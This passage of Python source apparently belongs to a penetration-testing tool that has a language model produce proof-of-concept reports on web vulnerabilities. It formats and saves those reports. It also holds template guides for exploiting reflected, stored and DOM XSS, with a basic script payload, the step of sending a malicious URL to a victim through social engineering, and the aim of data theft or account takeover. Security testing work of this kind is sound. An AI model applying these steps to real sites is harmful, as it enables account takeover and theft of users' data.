    exploit_xss(target, "q")
"""
        else:
            return "# Exploitation script for " + module_name
    
    def _display_poc_report(self, poc_report: Dict[str, Any]) -> None:
        """Display the POC report in a formatted way."""
        print("\n" + "="*80)
        print("                    PROOF OF CONCEPT REPORT")
        print("="*80)
        
        # Display metadata
        print(f"\nTarget: {poc_report.get('target', 'Unknown')}")
        print(f"Module: {poc_report.get('module', 'Unknown')}")
        print(f"Generated: {poc_report.get('generated_at', 'Unknown')}")
        print(f"Model: {poc_report.get('model', 'Unknown')}")
        print(f"Backend: {poc_report.get('backend', 'Unknown')}")
        
        # Display vulnerability summary
        if 'vulnerability_summary' in poc_report:
            summary = poc_report['vulnerability_summary']
            print(f"\n[VULNERABILITY SUMMARY]")
            print(f"Total Vulnerabilities: {summary.get('total_count', 0)}")
            print(f"Exploitation Difficulty: {summary.get('exploitation_difficulty', 'Unknown')}")
            
            severity = summary.get('severity_breakdown', {})
            if severity:
                print("\nSeverity Breakdown:")
                for level, count in severity.items():
                    if count > 0:
                        print(f"  - {level.upper()}: {count}")
        
        # Display structured POC sections
        if 'structured_poc' in poc_report:
            structured = poc_report['structured_poc']
            
            # Executive Summary
            if structured.get('executive_summary'):
                print("\n[EXECUTIVE SUMMARY]")
                print("-"*40)
                summary_text = structured['executive_summary']
                # Truncate if too long
                if len(summary_text) > 500:
                    print(summary_text[:500] + "...")
                else:
                    print(summary_text)
            
            # Exploitation Details
            if structured.get('exploitation_details'):
                print("\n[EXPLOITATION DETAILS]")
                print("-"*40)
                details = structured['exploitation_details']
                if len(details) > 800:
                    print(details[:800] + "...")
                else:
                    print(details)
            
            # POC Code
            if structured.get('poc_code'):
                print("\n[PROOF OF CONCEPT CODE]")
                print("-"*40)
                code = structured['poc_code']
                if len(code) > 600:
                    print(code[:600] + "...")
                else:
                    print(code)
            
            # Extracted Payloads
            if structured.get('payloads'):
                print("\n[EXTRACTED PAYLOADS]")
                print("-"*40)
                for i, payload in enumerate(structured['payloads'][:5], 1):
                    print(f"{i}. {payload}")
            
            # Risk Level
            if structured.get('risk_level'):
                print(f"\n[RISK ASSESSMENT]: {structured['risk_level']}")
        
        # Display XSS-specific information if available
        if 'xss_specific' in poc_report:
            xss_info = poc_report['xss_specific']
            
            if xss_info.get('exploitation_scenarios'):
                print("\n[XSS EXPLOITATION SCENARIOS]")
                print("-"*40)
                for scenario in xss_info['exploitation_scenarios'][:3]:
                    print(f"\n• {scenario['name']}")
                    print(f"  {scenario['description']}")
        
        # Display automation scripts info
        if 'automation' in poc_report:
            print("\n[AUTOMATION SCRIPTS]")
            print("-"*40)
            print("✓ Verification script generated")
            print("✓ Exploitation script generated")
        
        print("\n" + "="*80)
        print("                    END OF POC REPORT")
        print("="*80 + "\n")
    
    def _save_poc_report(self, poc_report: Dict[str, Any], target: str, module_name: str) -> str:
        """Save the POC report to a file."""
        try:
            # Create reports directory if it doesn't exist
            reports_dir = Path("reports/poc")
            reports_dir.mkdir(parents=True, exist_ok=True)
            
            # Generate filename
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            clean_target = target.replace('://', '_').replace('/', '_').replace('.', '_')
            filename = f"poc_{module_name}_{clean_target}_{timestamp}.json"
            
            file_path = reports_dir / filename
            
            # Save the report
            with open(file_path, 'w', encoding='utf-8') as f:
                json.dump(poc_report, f, indent=2, default=str)
            
            print(f"\n[+] POC report saved to: {file_path}")
            return str(file_path)
            
        except Exception as e:
            logger.error(f"Failed to save POC report: {e}")
            return None
    
    def _get_reflected_xss_template(self) -> str:
        """Get template for reflected XSS POC."""
        return """
        Reflected XSS Exploitation Guide:
        1. Identify injection point in URL parameters
        2. Test with basic payload: <script>alert(1)</script>
        3. Check response for payload reflection
        4. Craft context-specific payload
        5. Create malicious URL for victim
        6. Social engineering to deliver URL
        """
    
    def _get_stored_xss_template(self) -> str:
        """Get template for stored XSS POC."""
        return """
        Stored XSS Exploitation Guide:
        1. Identify persistent input fields (comments, profiles, etc.)
        2. Submit XSS payload to storage
        3. Verify payload persistence in database
        4. Identify all pages where payload executes
        5. Calculate impact (affected users)
        6. Demonstrate data theft or account takeover
        """
    
    def _get_dom_xss_template(self) -> str:
        """Get template for DOM XSS POC."""
        return """
        DOM XSS Exploitation Guide:
        1. Identify client-side JavaScript sinks
        2. Trace data flow from source (URL, cookies) to sink
        3. Craft payload for specific sink type
        4. Use fragment identifier (#) to avoid server-side filters
        5. Test in browser console
        6. Create proof-of-concept with hash-based payload
        """


# Singleton instance
poc_generator = POCGenerator()
